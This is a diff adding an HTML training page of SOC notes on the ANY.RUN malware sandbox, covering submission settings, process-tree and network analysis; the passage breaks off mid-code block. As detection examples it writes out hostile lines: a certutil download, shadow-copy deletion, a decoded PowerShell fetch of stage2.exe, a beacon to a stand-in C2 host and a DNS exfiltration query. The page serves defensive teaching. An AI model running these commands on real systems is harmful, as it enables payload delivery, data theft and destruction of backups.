@@ -1,0 +1,1611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ANY.RUN — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .xref {
+      display: inline-block;
+      font-size: 0.78rem;
+      color: var(--accent);
+      border: 1px solid var(--accent);
+      border-radius: 4px;
+      padding: 1px 7px;
+      margin: 2px 3px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: background 0.15s, color 0.15s;
+    }
+    .xref:hover {
+      background: var(--accent);
+      color: #fff;
+    }
+    .xref-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      margin-top: 6px;
+    }
+    td .xref-group {
+      margin-top: 2px;
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <a href="index.html" class="nav-brand">
+    <span class="icon">⬡</span> SOC Notes
+  </a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="elk.html">ELK Stack</a>
+    <a href="openvas.html">OpenVAS</a>
+    <a href="kali.html">Kali Linux</a>
+    <a href="metasploit.html">Metasploit</a>
+    <a href="yara.html">YARA</a>
+    <a href="zeek.html">Zeek</a>
+    <a href="clamav.html">ClamAV</a>
+    <a href="misp.html">MISP</a>
+    <a href="cuckoo.html">Cuckoo</a>
+    <a href="velociraptor.html">Velociraptor</a>
+    <a href="autopsy.html">Autopsy</a>
+    <a href="anyrun.html" class="active">ANY.RUN</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="snort.html">Snort</a>
+    <a href="ossec.html">OSSEC</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()">☰</button>
+
+<aside id="sb" class="sidebar"></aside>
+
+<main id="main" class="main">
+  <div id="content-area"></div>
+</main>
+
+<!-- ============================================================
+     SECTION 01 — Overview & Architecture
+     ============================================================ -->
+<template id="tpl-overview">
+  <h1>ANY.RUN — Interactive Malware Sandbox</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">ANY.RUN captures full malware execution including L3 C2 IP connections, L4 TCP/UDP port behavior, and L7 HTTP/DNS/HTTPS application-layer traffic.</span>
+  </div>
+  <p>ANY.RUN is a cloud-based interactive malware sandbox that lets analysts observe, interact with, and investigate malware in real time inside a live Windows or Linux VM. Unlike automated sandboxes (Cuckoo), ANY.RUN gives you live mouse/keyboard control of the analysis environment — critical for defeating evasion techniques that detect non-interactive execution.</p>
+
+  <h2>Key Differentiators vs. Cuckoo</h2>
+  <table>
+    <tr><th>Feature</th><th>ANY.RUN</th><th>Cuckoo Sandbox</th></tr>
+    <tr><td>Interaction</td><td>Live — mouse, keyboard, browser control</td><td>Automated — no interaction</td></tr>
+    <tr><td>Deployment</td><td>Cloud SaaS (no setup required)</td><td>Self-hosted (VM infrastructure needed)</td></tr>
+    <tr><td>Evasion Defeat</td><td>Manual interaction defeats user-activity checks</td><td>Evasion often succeeds against automated</td></tr>
+    <tr><td>Real-time View</td><td>Watch process tree, network, and disk live</td><td>Review report after analysis completes</td></tr>
+    <tr><td>Collaboration</td><td>Share task URLs publicly or with team</td><td>Private (local deployment)</td></tr>
+    <tr><td>Cost</td><td>Free tier (public tasks); paid for private</td><td>Free (self-hosted)</td></tr>
+    <tr><td>OS Support</th><td>Windows 7/10/11, Linux (Ubuntu)</td><td>Windows 7/10, Linux</td></tr>
+  </table>
+
+  <h2>Platform Architecture</h2>
+  <table>
+    <tr><th>Component</th><th>Role</th></tr>
+    <tr><td>Analysis VM</td><td>Isolated Windows/Linux VM where sample runs</td></tr>
+    <tr><td>Network Interceptor</td><td>Captures all HTTP/HTTPS/DNS in real time; HTTPS decrypted via MitM</td></tr>
+    <tr><td>Process Monitor</td><td>API hooking + kernel driver — records syscalls, process creation, registry, file I/O</td></tr>
+    <tr><td>Suricata IDS</td><td>Real-time rule matching against captured network traffic</td></tr>
+    <tr><td>MITRE ATT&amp;CK Mapper</td><td>Maps observed behaviors to ATT&amp;CK techniques automatically</td></tr>
+    <tr><td>IOC Extractor</td><td>Extracts network IOCs (IPs/domains/URLs) and host IOCs (hashes/paths/registry keys)</td></tr>
+    <tr><td>Report Engine</td><td>Generates shareable HTML report, JSON export, MISP-compatible IOC list</td></tr>
+  </table>
+
+  <h2>Free vs. Paid Tiers</h2>
+  <table>
+    <tr><th>Feature</th><th>Free (Community)</th><th>Paid (Individual/Team)</th></tr>
+    <tr><td>Task visibility</td><td>Public (visible to all)</td><td>Private</td></tr>
+    <tr><td>Analysis duration</td><td>60 seconds</td><td>Up to 10 minutes</td></tr>
+    <tr><td>File size limit</td><td>16 MB</td><td>100 MB</td></tr>
+    <tr><td>Windows versions</td><td>Win 7 only</td><td>Win 7, 10, 11</td></tr>
+    <tr><td>HTTPS decryption</td><td>Limited</td><td>Full</td></tr>
+    <tr><td>API access</td><td>No</td><td>Yes</td></tr>
+    <tr><td>Team sharing</td><td>No</td><td>Yes</td></tr>
+  </table>
+
+  <div class="callout warn">
+    <strong>Privacy Warning</strong> — Free tier tasks are public. Never submit real malware samples that may contain sensitive victim data, proprietary documents, or PII. Use private tasks for operational samples.
+  </div>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('submission'); return false;">Task Submission ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('process'); return false;">Process Tree ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('network'); return false;">Network Activity ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Understanding the ANY.RUN Sandbox</h4>
+      <ul>
+        <li>ANY.RUN is a cloud-based interactive sandbox — no local VM setup required</li>
+        <li>Free tier runs public tasks (60 seconds, Windows 7); paid tier enables private and longer analysis</li>
+        <li>The platform monitors L3 IP connections, L4 TCP/UDP ports, and L7 HTTP/DNS traffic simultaneously</li>
+        <li>Never submit sensitive files on free tier — all public tasks are visible to anyone</li>
+      </ul>
+      <pre><code><span class="cm"># Getting started: navigate to the platform</span>
+app.any.run
+<span class="cm"># Click "New Task" → upload file or paste URL → click "Run"</span>
+<span class="cm"># Watch the live process tree, network panel, and threats panel</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Comparing ANY.RUN to Cuckoo</h4>
+      <ul>
+        <li>ANY.RUN defeats user-activity sandbox evasion through live mouse/keyboard interaction</li>
+        <li>Cuckoo is self-hosted (better for sensitive samples); ANY.RUN is SaaS (faster, no infrastructure)</li>
+        <li>Use ANY.RUN for quick triage and interactive investigation; use Cuckoo for private automated bulk analysis</li>
+      </ul>
+      <pre><code><span class="cm"># ANY.RUN advantage: defeat time-bomb evasion</span>
+<span class="cm"># Settings → Time Acceleration → fast-forward clock</span>
+<span class="cm"># Settings → User Activity → Mouse movement (realistic)</span>
+<span class="cm"># Settings → Country → select geo-fenced target region</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Architecture-Aware Analysis Strategy</h4>
+      <ul>
+        <li>ANY.RUN's Network Interceptor performs MitM HTTPS decryption — enables full L7 visibility into encrypted C2 channels</li>
+        <li>Suricata IDS runs inline against all captured traffic — L3/L4/L7 rule matching in real time</li>
+        <li>Combine ANY.RUN public task search + MISP + SIEM to pivot from one sample to campaign-level infrastructure</li>
+      </ul>
+      <pre><code><span class="cm"># Pivot from ANY.RUN to campaign hunting:</span>
+<span class="cm"># 1. ANY.RUN → IOC: collect C2 IPs and domains</span>
+<span class="cm"># 2. Search ANY.RUN submissions by C2 IP → find related samples</span>
+<span class="cm"># 3. Cross-reference in SIEM:</span>
+index=network dest_ip IN (185.220.101.47, 194.5.249.12)
+| stats count by src_ip, dest_port, _time</code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 02 — Task Submission & Environment Config
+     ============================================================ -->
+<template id="tpl-submission">
+  <h1>Task Submission &amp; Environment Configuration</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Task submission and environment configuration operate at L7 — files, URLs, and configuration are transmitted via the HTTPS web interface or REST API.</span>
+  </div>
+  <p>ANY.RUN tasks can be created by uploading a file, submitting a URL, or using the API. Environment configuration determines how the sample is executed and how evasion is defeated.</p>
+
+  <h2>Submission Methods</h2>
+  <table>
+    <tr><th>Method</th><th>Use Case</th></tr>
+    <tr><td>File Upload</td><td>Submit executable, document, archive, or script for analysis</td></tr>
+    <tr><td>URL Analysis</td><td>Submit a URL — ANY.RUN opens it in a browser and observes drive-by download or phishing behavior</td></tr>
+    <tr><td>Hash Lookup</td><td>Search existing public tasks by SHA-256 (free); if found, view existing analysis</td></tr>
+    <tr><td>API Submission</td><td>Programmatic submission for SOAR/SIEM integration (paid)</td></tr>
+  </table>
+
+  <h2>Environment Settings</h2>
+  <table>
+    <tr><th>Setting</th><th>Options</th><th>Recommendation</th></tr>
+    <tr><td>OS Version</td><td>Windows 7, 10, 11, Ubuntu 22.04</td><td>Match target environment; use Win 10 for most modern malware</td></tr>
+    <tr><td>Bitness</td><td>32-bit, 64-bit</td><td>Match sample bitness; 64-bit for most modern threats</td></tr>
+    <tr><td>User Activity Simulation</td><td>None, Mouse movement, Realistic (scrolling)</td><td>Enable — defeats many sandbox evasion checks</td></tr>
+    <tr><td>Network</td><td>Enabled / Disabled / Fake network</td><td>Enabled — allows C2 callback, DNS, HTTP to be captured</td></tr>
+    <tr><td>Residence</td><td>Various countries</td><td>Select target region — geo-fenced malware may only activate in specific countries</td></tr>
+    <tr><td>Browser</td><td>IE, Chrome, Firefox</td><td>Match phishing target; Chrome for most modern lures</td></tr>
+    <tr><td>Start Program</td><td>Auto-detect / Specify</td><td>Specify for DLL: use rundll32.exe with export name</td></tr>
+    <tr><td>UAC Prompt</td><td>Auto-confirm / Leave</td><td>Auto-confirm for full execution path; leave for realistic analysis</td></tr>
+    <tr><td>Archive Password</td><td>Text field</td><td>Enter if sample is password-protected (common in phishing: "infected", "virus")</td></tr>
+  </table>
+
+  <h2>Sample Type Execution Paths</h2>
+  <table>
+    <tr><th>File Type</th><th>Execution Method</th><th>Notes</th></tr>
+    <tr><td>.exe</td><td>Direct execution</td><td>Auto-detected</td></tr>
+    <tr><td>.dll</td><td><code>rundll32.exe sample.dll,ExportName</code></td><td>Specify export; try <code>DllMain</code>, <code>Run</code>, <code>Install</code></td></tr>
+    <tr><td>.doc/.docx</td><td>Opened in Word</td><td>Enable macros in settings; check "enable editing" interaction</td></tr>
+    <tr><td>.xls/.xlsm</td><td>Opened in Excel</td><td>Enable macros; watch for Excel4 macro (XLM) abuse</td></tr>
+    <tr><td>.pdf</td><td>Opened in Acrobat Reader</td><td>Watch for JavaScript execution, embedded objects</td></tr>
+    <tr><td>.ps1</td><td><code>powershell.exe -File sample.ps1</code></td><td>Enable script execution policy bypass in settings</td></tr>
+    <tr><td>.js/.vbs/.hta</td><td><code>wscript.exe</code> / <code>cscript.exe</code> / <code>mshta.exe</code></td><td>Common dropper formats</td></tr>
+    <tr><td>.lnk</td><td>Shell execute</td><td>Often contains embedded commands</td></tr>
+    <tr><td>URL</td><td>Browser navigates to URL</td><td>Captures phishing page, drive-by download</td></tr>
+  </table>
+
+  <h2>Defeating Evasion Techniques</h2>
+  <ul>
+    <li><strong>User Activity</strong>: Enable mouse simulation — defeats checks for mouse movement (a common sandbox detector)</li>
+    <li><strong>Time Acceleration</strong>: ANY.RUN can fast-forward the clock — defeats time-bomb malware that sleeps for N minutes</li>
+    <li><strong>Country Spoofing</strong>: Select specific country — defeats geo-fencing (malware that only runs in Ukraine, Russia, etc.)</li>
+    <li><strong>Interactive Clicks</strong>: You can click "Enable Content" in Office documents, dismiss dialogs, and follow infection chains manually</li>
+    <li><strong>HTTPS Decryption</strong>: MitM certificate injection — decrypts TLS traffic for analysis (paid)</li>
+  </ul>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('process'); return false;">Process Tree ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('network'); return false;">Network Activity ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Submitting Your First Sample</h4>
+      <ul>
+        <li>Upload a file or paste a URL into the New Task dialog at app.any.run</li>
+        <li>Select Windows 10 64-bit as the OS for most modern malware samples</li>
+        <li>Enable "User Activity: Mouse movement" to defeat basic sandbox evasion checks</li>
+        <li>Keep network enabled so L3/L4 C2 callbacks and L7 HTTP/DNS traffic are captured</li>
+      </ul>
+      <pre><code><span class="cm"># Basic submission checklist:</span>
+<span class="cm"># OS: Windows 10 (64-bit)</span>
+<span class="cm"># User Activity: Mouse movement (realistic)</span>
+<span class="cm"># Network: Enabled</span>
+<span class="cm"># Duration: 60s (free) or 120s (paid)</span>
+<span class="cm"># Click "Run" and watch the live analysis</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Environment Tuning for Evasive Samples</h4>
+      <ul>
+        <li>Use country spoofing to defeat geo-fenced malware that only activates in specific regions</li>
+        <li>Specify DLL exports manually: <code>rundll32.exe sample.dll,ExportName</code></li>
+        <li>Enable time acceleration to defeat time-bomb malware that sleeps before executing</li>
+        <li>For password-protected archives, enter the password ("infected" or "virus" are common phishing archive passwords)</li>
+      </ul>
+      <pre><code><span class="cm"># DLL analysis: specify export in "Start Program" field</span>
+rundll32.exe sample.dll,DllMain
+rundll32.exe sample.dll,Run
+rundll32.exe sample.dll,Install
+
+<span class="cm"># Office macro: set "Enable Content" auto-click = Yes</span>
+<span class="cm"># UAC Prompt: Auto-confirm for full execution path</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Defeating Advanced Evasion During Submission</h4>
+      <ul>
+        <li>Combine country + browser + user-activity settings to defeat multi-condition evasion (geo + interaction + browser version checks)</li>
+        <li>Enable HTTPS decryption (paid) to get full L7 visibility into TLS-encrypted C2 — otherwise C2 payloads are opaque</li>
+        <li>Use fake network mode to prevent live C2 beacon registration while still observing outbound connection attempts</li>
+      </ul>
+      <pre><code><span class="cm"># Defeating multi-condition evasion:</span>
+<span class="cm"># OS: Windows 10 (64-bit) + Country: Ukraine + Browser: Chrome</span>
+<span class="cm"># User Activity: Realistic (scrolling) + UAC: Auto-confirm</span>
+<span class="cm"># Time Acceleration: +30 minutes (bypasses time-bomb sleep)</span>
+<span class="cm"># HTTPS Decryption: Enabled (MitM cert injection for L7 TLS visibility)</span></code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 03 — Live Process Tree Navigation
+     ============================================================ -->
+<template id="tpl-process">
+  <h1>Live Process Tree Navigation</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Process tree analysis operates at L7 — it tracks application-layer behavior: process creation, API calls, file/registry operations, and script execution chains within the analysis VM.</span>
+  </div>
+  <p>The process tree is the most important view in ANY.RUN. It shows all processes spawned during analysis in a parent-child hierarchy, color-coded by suspicion level, with API call logs, file and registry operations accessible per process.</p>
+
+  <h2>Process Tree Color Coding</h2>
+  <table>
+    <tr><th>Color</th><th>Meaning</th></tr>
+    <tr><td style="color:#4caf50">Green</td><td>Normal system process — low suspicion</td></tr>
+    <tr><td style="color:#ff9800">Orange</td><td>Suspicious behavior detected</td></tr>
+    <tr><td style="color:#f44336">Red</td><td>Malicious — confirmed by signature, behavior, or Suricata rule</td></tr>
+    <tr><td style="color:#9e9e9e">Gray</td><td>Injected process or terminated process</td></tr>
+  </table>
+
+  <h2>Key Fields Per Process</h2>
+  <table>
+    <tr><th>Field</th><th>Description</th></tr>
+    <tr><td>PID</td><td>Process ID</td></tr>
+    <tr><td>Image</td><td>Executable name and path</td></tr>
+    <tr><td>Command Line</td><td>Full command line arguments — critical for dropper analysis</td></tr>
+    <tr><td>Parent PID</td><td>Parent process — unusual parents reveal injection/spawning chains</td></tr>
+    <tr><td>Start Time</td><td>Timestamp relative to analysis start (seconds)</td></tr>
+    <tr><td>Status</td><td>Running / Exited / Injected</td></tr>
+    <tr><td>Severity</td><td>Suspicion level (Info / Suspicious / Malicious)</td></tr>
+  </table>
+
+  <h2>Suspicious Process Chain Patterns</h2>
+  <table>
+    <tr><th>Pattern</th><th>Technique</th><th>ATT&amp;CK</th></tr>
+    <tr><td><code>WINWORD.EXE → cmd.exe → powershell.exe</code></td><td>Macro dropper</td><td>T1566 Phishing + T1059.001</td></tr>
+    <tr><td><code>Excel.exe → regsvr32.exe → rundll32.exe</code></td><td>XLM macro / DLL hijack</td><td>T1218.010 + T1218.011</td></tr>
+    <tr><td><code>mshta.exe → wscript.exe → cmd.exe</code></td><td>HTA dropper chain</td><td>T1218.005</td></tr>
+    <tr><td><code>explorer.exe → malware.exe</code> (unusual parent)</td><td>Process hollowing or injection</td><td>T1055</td></tr>
+    <tr><td><code>powershell.exe -enc [base64]</code></td><td>Encoded PowerShell execution</td><td>T1059.001 + T1027</td></tr>
+    <tr><td><code>svchost.exe → [unsigned DLL]</code></td><td>DLL injection into service</td><td>T1055.001</td></tr>
+    <tr><td><code>certutil.exe -urlcache -split -f</code></td><td>LOLBin download</td><td>T1105</td></tr>
+    <tr><td><code>wmic.exe process call create</code></td><td>Lateral movement / execution</td><td>T1047</td></tr>
+    <tr><td><code>vssadmin.exe delete shadows</code></td><td>Shadow copy deletion (ransomware prep)</td><td>T1490</td></tr>
+  </table>
+
+  <h2>API Call Analysis</h2>
+  <p>Click any process → <strong>More Details</strong> → <strong>API Calls</strong> tab. Shows every Windows API call with arguments and return values.</p>
+  <table>
+    <tr><th>API Category</th><th>Key APIs</th><th>Indicates</th></tr>
+    <tr><td>Network</td><td>WSAConnect, InternetOpenUrl, HttpSendRequest</td><td>C2 communication, download</td></tr>
+    <tr><td>File System</td><td>CreateFile, WriteFile, DeleteFile, MoveFile</td><td>File drop, encryption, persistence</td></tr>
+    <tr><td>Registry</td><td>RegSetValue, RegCreateKey, RegDeleteKey</td><td>Persistence, configuration storage</td></tr>
+    <tr><td>Process</td><td>CreateProcess, OpenProcess, WriteProcessMemory</td><td>Process injection, lateral movement</td></tr>
+    <tr><td>Crypto</td><td>CryptEncrypt, CryptAcquireContext, BCryptEncrypt</td><td>Ransomware file encryption</td></tr>
+    <tr><td>Anti-analysis</td><td>IsDebuggerPresent, CheckRemoteDebuggerPresent, GetTickCount</td><td>Sandbox/debugger detection</td></tr>
+    <tr><td>Persistence</td><td>SetWindowsHookEx, RegisterClassEx</td><td>Keylogger, hook installation</td></tr>
+  </table>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('network'); return false;">Network Activity ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('ioc'); return false;">IOC Extraction ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('attack'); return false;">ATT&CK Mapping ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Reading the Process Tree</h4>
+      <ul>
+        <li>Green processes are low-suspicion; orange are suspicious; red are confirmed malicious</li>
+        <li>Parent-child relationships reveal infection chains — e.g., Word spawning PowerShell is always suspicious</li>
+        <li>Click any process to see its full command line, which exposes encoded payloads and download URLs</li>
+        <li>Process tree operates at L7 — it shows application execution behavior, not network packets</li>
+      </ul>
+      <pre><code><span class="cm"># Suspicious parent-child patterns to watch for:</span>
+WINWORD.EXE → cmd.exe        <span class="cm"># macro execution</span>
+Excel.exe → regsvr32.exe     <span class="cm"># XLM macro / LOLBin abuse</span>
+mshta.exe → wscript.exe      <span class="cm"># HTA dropper chain</span>
+powershell.exe -enc [base64] <span class="cm"># encoded download stager</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>API Call Analysis per Process</h4>
+      <ul>
+        <li>Click a process → More Details → API Calls to see every Windows API call with arguments</li>
+        <li>Network APIs (WSAConnect, InternetOpenUrl) confirm C2 communication paths</li>
+        <li>Crypto APIs (CryptEncrypt, BCryptEncrypt) confirm ransomware file encryption activity</li>
+        <li>Anti-analysis APIs (IsDebuggerPresent, GetTickCount) reveal sandbox evasion attempts</li>
+      </ul>
+      <pre><code><span class="cm"># API sequences that confirm process injection:</span>
+OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
+<span class="cm"># T1055.001 — DLL injection confirmed by this API chain</span>
+
+<span class="cm"># Shadow copy deletion confirms ransomware:</span>
+vssadmin.exe delete shadows /all /quiet  <span class="cm"># T1490</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Decoding Encoded Execution Chains</h4>
+      <ul>
+        <li>Base64-encoded PowerShell arguments (-enc flag) hide download URLs and secondary payloads — always decode them</li>
+        <li>Process hollowing shows as CreateProcess (suspended) + NtUnmapViewOfSection + WriteProcessMemory — check ALL three APIs</li>
+        <li>Cross-reference process command lines with network panel — confirm which process made which L3/L4 connection</li>
+      </ul>
+      <pre><code><span class="cm"># Decode base64 PowerShell command from process tree:</span>
+echo "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0..." | base64 -d
+<span class="cm"># Reveals: Invoke-WebRequest -Uri http://185.220.101.47/stage2.exe</span>
+
+<span class="cm"># Process hollowing API sequence to alert on:</span>
+<span class="cm"># CreateProcess (CREATE_SUSPENDED) → NtUnmapViewOfSection</span>
+<span class="cm"># → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread</span></code></pre>
+    </div>
+  </details>
+</template>
+
+<!-- ============================================================
+     SECTION 04 — Network Activity Capture
+     ============================================================ -->
+<template id="tpl-network">
+  <h1>Network Activity Capture</h1>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Network capture covers L3 (source/destination IPs, routing), L4 (TCP/UDP ports, connection state), and L7 (HTTP requests, DNS queries, HTTPS content via MitM decryption).</span>
+  </div>
+  <p>ANY.RUN captures all network traffic in real time, including DNS queries, HTTP/HTTPS requests, TCP/UDP connections, and Suricata IDS alerts. This is often the richest source of C2 infrastructure IOCs.</p>
+
+  <h2>Network Panel Tabs</h2>
+  <table>
+    <tr><th>Tab</th><th>Contents</th></tr>
+    <tr><td>HTTP Requests</td><td>Method, URL, response code, content type, file downloaded</td></tr>
+    <tr><td>DNS Requests</td><td>Queried domain, query type (A, AAAA, MX, TXT), resolved IP</td></tr>
+    <tr><td>Connections</td><td>Protocol, src/dst IP, dst port, bytes in/out, connection status</td></tr>
+    <tr><td>Threats</td><td>Suricata rule matches — rule SID, severity, matched traffic</td></tr>
+  </table>
+
+  <h2>C2 Communication Indicators</h2>
+  <table>
+    <tr><th>Indicator</th><th>Description</th><th>ATT&amp;CK</th></tr>
+    <tr><td>Beacon interval</td><td>Repeated HTTP requests at regular intervals (30s, 60s)</td><td>T1071 — Application Layer Protocol</td></tr>
+    <tr><td>Jitter</td><td>Beacon interval with ±% randomization — evades fixed-interval detection</td><td>T1071</td></tr>
+    <tr><td>Malleable C2</td><td>HTTP requests mimicking legitimate traffic (Amazon, Google headers)</td><td>T1071.001</td></tr>
+    <tr><td>DNS C2</td><td>TXT record queries to DGA domains; data encoded in hostname</td><td>T1071.004</td></tr>
+    <tr><td>HTTPS to unusual port</td><td>TLS on port 8443, 4443, 8080 to non-CDN IP</td><td>T1571 — Non-Standard Port</td></tr>
+    <tr><td>Large upload to unknown IP</td><td>POST with large body to IP-direct URL — data exfiltration</td><td>T1048</td></tr>
+    <tr><td>.onion via Tor</td><td>Connection to 127.0.0.1:9050 (Tor SOCKS proxy) then .onion</td><td>T1090.003</td></tr>
+  </table>
+
+  <h2>HTTP Request Analysis</h2>
+  <pre><code># Example — Cobalt Strike beacon check-in:
+GET /jquery-3.3.1.slim.min.js HTTP/1.1
+Host: malicious-c2.example.com
+Accept: text/javascript, application/javascript
+Cookie: __cfduid=d[base64 encoded data]
+
+# Key indicators:
+# - Legitimate-looking URI path but suspicious host
+# - Cookie header carries encoded beacon data
+# - User-Agent matches no real browser version
+# - Regular 60-second interval (beacon)</code></pre>
+
+  <h2>DNS Analysis</h2>
+  <pre><code># DGA (Domain Generation Algorithm) indicators:
+# - High-entropy domain names (random-looking)
+# - Short TTL (< 300 seconds)
+# - Rapid succession of NX (NXDOMAIN) responses
+# - .xyz, .top, .click, .tk TLDs
+
+# Example DGA domains observed:
+kxqrtbmvdaz.xyz      NXDOMAIN
+pqwlsnyfjbr.xyz      NXDOMAIN
+mtzvcxhdqok.xyz      NXDOMAIN  ← rapid NX = DGA beacon
+akvnsrpymfl.xyz      NXDOMAIN
+# Eventually one resolves → active C2 seed
+
+# DNS C2 (data exfil over DNS):
+QUERY: aGVsbG8gd29ybGQ.c2.attacker.com TXT
+# Subdomain is base64-encoded exfil data</code></pre>
+
+  <h2>Downloading the PCAP</h2>
+  <p>ANY.RUN captures a full PCAP of the analysis session. Download via:</p>
+  <ul>
+    <li><strong>Report page → Network → Download PCAP</strong></li>
+    <li>Open in Wireshark for deeper protocol analysis</li>
+    <li>Run through Zeek for log-based hunting</li>
+    <li>Extract files transferred: Wireshark → File → Export Objects → HTTP</li>
+  </ul>
+
+  <div class="xref-group">
+    <span>Related:</span>
+    <a href="#" class="xref" onclick="loadTopic('ioc'); return false;">IOC Extraction ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('suricata'); return false;">Suricata Correlation ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Reading the Network Panels</h4>
+      <ul>
+        <li>HTTP Requests tab shows L7 application-layer URLs, methods, and response codes — look for suspicious POST requests indicating C2 beaconing</li>
+        <li>DNS Requests tab shows L7 domain queries — high NXDOMAIN rates suggest DGA malware scanning for active C2 seeds</li>
+        <li>Connections tab shows L3 IPs and L4 ports — unexpected outbound ports (e.g., 8443, 4444) are suspicious</li>
+        <li>Threats tab shows Suricata IDS rule matches against all captured traffic</li>
+      </ul>
+      <pre><code><span class="cm"># What to look for in each panel tab:</span>
+<span class="cm"># HTTP: POST to /gate.php or /beacon/check = C2 checkin</span>
+<span class="cm"># DNS: rapid NX responses = DGA beacon scanning</span>
+<span class="cm"># Connections: outbound L3 IP on L4 port 587 = SMTP exfil</span>
+<span class="cm"># Threats: Suricata alert = known malware family confirmed</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Identifying C2 Communication Patterns</h4>
+      <ul>
+        <li>Beacon intervals: repeated HTTP requests every 30–60 seconds to the same L3 IP indicate automated C2 check-in (T1071.001)</li>
+        <li>Malleable C2: HTTP requests with legitimate-looking L7 headers (mimicking Amazon, Google) hide C2 data in cookies or URI paths</li>
+        <li>DNS C2: base64-encoded data in subdomain labels, exfiltrated via L7 TXT record queries (T1071.004)</li>
+      </ul>
+      <pre><code><span class="cm"># Detect beacon intervals in network panel:</span>
+<span class="cm"># Filter HTTP by destination IP → sort by timestamp</span>
+<span class="cm"># Regular 30s/60s interval = automated C2 beacon</span>
+
+<span class="cm"># DNS C2 example: subdomain carries encoded payload</span>
+QUERY: aGVsbG8gd29ybGQ.c2.attacker.com TXT
+<span class="cm"># Decode: echo "aGVsbG8gd29ybGQ" | base64 -d</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>PCAP Analysis and Protocol Pivoting</h4>
+      <ul>
+        <li>Download the full PCAP and open in Wireshark to apply custom display filters and follow TCP streams for L4 session reconstruction</li>
+        <li>Run PCAP through Zeek to produce conn.log, dns.log, and http.log for log-based threat hunting</li>
+        <li>Extract transferred files from PCAP: Wireshark → File → Export Objects → HTTP recovers dropped payloads</li>
+      </ul>
+      <pre><code><span class="cm"># Zeek analysis of ANY.RUN PCAP:</span>
+zeek -r analysis.pcap
+<span class="cm"># Outputs: conn.log  dns.log  http.log  ssl.log  files.log</span>
+
+<span class="cm"># Extract JA3 client fingerprint from ssl.log:</span>
+cat ssl.log | zeek-cut ja3 ja3s server_name | sort | uniq
+
+<span class="cm"># Wireshark filter: show only C2 beacon traffic to known L3 IP:</span>
